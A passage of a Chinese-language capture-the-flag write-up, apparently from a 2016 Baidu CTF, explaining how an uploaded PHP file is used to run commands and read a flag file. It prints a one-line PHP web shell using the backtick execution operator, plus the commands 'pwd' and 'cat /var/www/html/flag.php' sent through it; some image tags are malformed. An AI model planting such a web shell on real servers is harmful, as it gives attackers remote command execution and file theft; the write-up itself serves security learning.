...
<p><img src="img src="/images/postimage/2016-10-17-baiductf_901/13.png" alt=""><br>　　成功上传后，返回文件绝对路径/u/1.php<br>　　对1.php发包，构造v=pwd，获取路径。<br>
<img src="img src="/images/postimage/2016-10-17-baiductf_901/14.png" alt=""><br>　　通过cat 获取flag.php文件，payload=cat /var/www/html/flag.php<br><img src="img src="/images/postimage/2016-10-17-baiductf_901/15.png" alt=""><br>　　tip:第一个payload&lt;script language=&quot;phP&quot;&gt;echo `$_REQUEST[v]`;&lt;/script&gt;中，为`而不是&#39;。<br>　　反引号（``） 执行运算符（注意这不是单引号）</p>
<p>　　PHP 将尝试将反引号中的内容作为外壳命令来执行，并将其输出信息返回（例如，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p>
